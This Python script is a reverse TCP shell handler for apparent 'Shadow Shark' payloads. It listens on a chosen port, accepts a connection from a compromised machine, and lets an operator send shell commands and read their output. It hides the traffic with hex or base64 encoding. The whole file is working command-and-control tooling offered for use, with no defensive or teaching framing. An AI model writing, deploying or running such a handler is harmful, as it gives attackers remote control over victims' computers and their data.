# -*- coding: utf-8 -*-
"""
This tool is a full fledged reverse TCP handler used to interact with Shadow Shark payloads.

@author: Mr. Shark Spam Bot
"""
import argparse
import socket
import sys
import codecs
import json

def get_arguments():
    '''Get the lhost and lport.'''
    parser = argparse.ArgumentParser(description='''This tool is a full fledged reverse TCP handler
used to interact with Shadow Shark payloads. Created by Mr. Shark Spam Bot.''')
    parser.add_argument('--lh', '--lhost', dest='lhost', required=True, type=str,
                        help='Your IP address.')
    parser.add_argument('--lp', '--lport', dest='lport', required=True, type=int,
                        help='The port to listen for connections on.')
    parser.add_argument('--encryption', '-e', dest='encryption', required=True,
                        type=str, help='The encryption used for sent and recieved data.')
    options = parser.parse_args()
    lhost = options.lhost
    lport = options.lport
    encryption = options.encryption
    try:
        socket.inet_aton(lhost)
    except socket.error:
        parser.error('Invalid option specified for lhost.')
    if encryption not in ['hex', 'base64']:
        parser.error('Only hex and base64 encryptions are supported.')
    return [lhost, lport, encryption]

def encryption_handler(text, encode=False, decode=False):
    '''Encode or decode text using hex or base64.'''
    encryption = arguments[2]
    if encode is True:
        new_text = text.encode()
        if encryption == 'hex':
            new_text = codecs.encode(new_text, encoding='hex')
        if encryption == 'base64':
            new_text = codecs.encode(new_text, encoding='base64')
        new_text = new_text.decode()
        new_text = json.dumps(new_text)
        new_text = new_text.encode()
    if decode is True:
        new_text = json.loads(text)
        new_text = new_text.encode()
        if encryption == 'hex':
            new_text = codecs.decode(new_text, encoding='hex')
        if encryption == 'base64':
            new_text = codecs.decode(new_text, encoding='base64')
        new_text = new_text.decode()
    return new_text

def listen():
    '''Accept the first incoming TCP connection.'''
    try:
        rev_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        lhost = arguments[0]
        lport = arguments[1]
        try:
            rev_socket.bind((lhost, lport))
        except OSError:
            print(f'{RED}\n[-] Lhost is not set to your IP or a process is currently running on lport.{NORMAL}')
            print(f'{RED}[-] Terminating program.{NORMAL}')
            sys.exit()
        rev_socket.listen(1)
        print(f'{BLUE}[*] A reverse TCP handler on {lhost}:{lport} has successfully started...{NORMAL}')
        connection, address = rev_socket.accept()
        return [rev_socket, connection, address]
    except KeyboardInterrupt:
        print(f'{YELLOW}\n[+] Ctrl + c detected.{NORMAL}')
        print(f'{RED}[-] Terminating program.{NORMAL}')
        rev_socket.close()
        sys.exit()

def main():
    '''Interact with the target by using a reverse TCP shell.'''
    try:
        rev_socket, connection, address = listen()
        rhost = address[0]
        rport = address[1]
        print(f'{GREEN}[+] A TCP connection from {rhost}:{rport} has been received.\n{NORMAL}')

        try:
            while True:
                connection.send(encryption_handler('directory', encode=True))
                directory = b''
                while True:
                    try:
                        directory = directory + connection.recv(1024)
                        if not directory:
                            break
                        if directory[-1] == 34:
                            break
                    except ValueError:
                        continue
                try:
                    directory = encryption_handler(directory, decode=True)
                except json.decoder.JSONDecodeError:
                    continue
                command = input(f'{directory} ')
                if command.lower().strip() == 'exit':
                    connection.send(encryption_handler('exit', encode=True))
                    connection.close()
                    rev_socket.close()
                    break
                if not command.strip():
                    continue
                connection.send(encryption_handler(command, encode=True))
                recv = b''
                while True:
                    try:
                        recv = recv + connection.recv(1024)
                        if not recv:
                            break
                        if recv[-1] == 34:
                            break
                    except ValueError:
                        continue
                try:
                    recv = encryption_handler(recv, decode=True)
                except json.decoder.JSONDecodeError:
                    continue
                if recv.strip():
                    print(recv.strip())
        except ConnectionError:
            print(f'{RED}\n[-] The reverse TCP connection was broken.{NORMAL}')
            print(f'{RED}[-] Terminating program.{NORMAL}')
            connection.close()
            rev_socket.close()
            sys.exit()
    except KeyboardInterrupt:
        print(f'{YELLOW}\n[+] Ctrl + c detected.{NORMAL}')
        print(f'{RED}[-] Terminating program.{NORMAL}')
        connection.send(encryption_handler('exit', encode=True))
        connection.close()
        rev_socket.close()
        sys.exit()

if __name__ == '__main__':
    print('''
\t                                             ``
\t                                       ``-+yhh-
\t                                    `:ohNMMMy.                  `.-`
\t                                `-ohNMMMMMM:                `.+hNy-
\t             ``.-:+osyyyhhhhhdddmMMMMMMMMMm---:::--..``````+dMMMo
\t      `:+syhdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNMMMMMo/-`                          ./o+
\t  `+ymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMms:`                 `:ohNMd:
\t`oNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMdo-          -+ymMMMMy-
\t :NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy/`  .+hNMMMMMNo.
\t  `/+shdmymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNhmMMMMMMMNo`
\t  osdhdosydNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNo`
\t  sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd/`
\t   ``:shNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy/.
\t       ``./ohdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdhhdmNMMMMMMNd+.
\t             ``.-:/+osyhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdhs+-`` ````.:+yhmNMMNh+.
\t                       ```.-:/+syyyhhdMMMMMMMMddddddddddddddNMMMMdo/:...``               ```.-/oys:
\t                                     `mMMMMMMM``````````````.sNMMh
\t                                      -mMMMMMM.               .smMy`
\t                                       .yMMMMMh`                `:ys.
\t                                         :yNMMMh.
\t                                           .odNMm:
\t                                             `-/sh:
    ''')
    NORMAL = '\033[0m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\33[33m'
    RED = '\033[91m'
    arguments = get_arguments()
    main()
